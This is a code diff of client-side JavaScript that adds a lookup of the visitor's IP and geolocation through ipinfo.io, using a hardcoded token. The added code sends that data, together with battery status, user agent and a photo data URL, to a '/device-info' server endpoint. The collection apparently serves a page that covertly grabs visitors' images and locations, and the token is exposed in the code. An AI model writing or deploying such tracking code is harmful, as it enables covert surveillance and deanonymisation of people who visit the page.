@@ -21,30 +21,48 @@
                 };
             }
 
+            // Function to get the user's IP and geolocation from an external service
+            async function getUserIPAndLocation() {
+                try {
+                    // Use ipinfo.io or ip-api.com to get the user's IP and geolocation
+                    const response = await fetch('https://ipinfo.io/json?token=2f751113cfc155'); // Replace 'YOUR_TOKEN' with your ipinfo token
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        geolocation: {
+                            city: data.city,
+                            country: data.country,
+                            region: data.region,
+                            loc: data.loc
+                        }
+                    };
+                } catch (error) {
+                    console.error('Error fetching IP and geolocation:', error);
+                    return {
+                        ip: 'unknown',
+                        geolocation: { city: 'unknown', country: 'unknown' }
+                    };
+                }
+            }
+
             // Function to send data to the server
             async function sendDeviceInfo(dataURL) {
                 const batteryStatus = await getBatteryStatus();
-                console.log('Battery Status:', batteryStatus); // Log battery status
-                
+                const ipData = await getUserIPAndLocation();
                 const userAgent = navigator.userAgent;
-                console.log('User Agent:', userAgent); // Log user agent
+
+                const deviceInfo = {
+                    ip: ipData.ip,
+                    geolocation: ipData.geolocation,
+                    batteryPercentage: batteryStatus.level,
+                    chargingStatus: batteryStatus.charging ? 'Charging' : 'Not Charging',
+                    userAgent: userAgent,
+                    photo: dataURL
+                };
+
+                console.log('Device Info:', deviceInfo); // Log device info
 
                 try {
-                    const ipResponse = await fetch('/ip');
-                    const ipData = await ipResponse.json();
-                    console.log('IP Data:', ipData); // Log IP data
-
-                    const deviceInfo = {
-                        ip: ipData.ip,
-                        geolocation: ipData.geolocation,
-                        batteryPercentage: batteryStatus.level,
-                        chargingStatus: batteryStatus.charging ? 'Charging' : 'Not Charging',
-                        userAgent: userAgent,
-                        photo: dataURL // Add photo data URL to device info
-                    };
-
-                    console.log('Device Info:', deviceInfo); // Log device info
-
                     await fetch('/device-info', {
                         method: 'POST',
                         headers: {
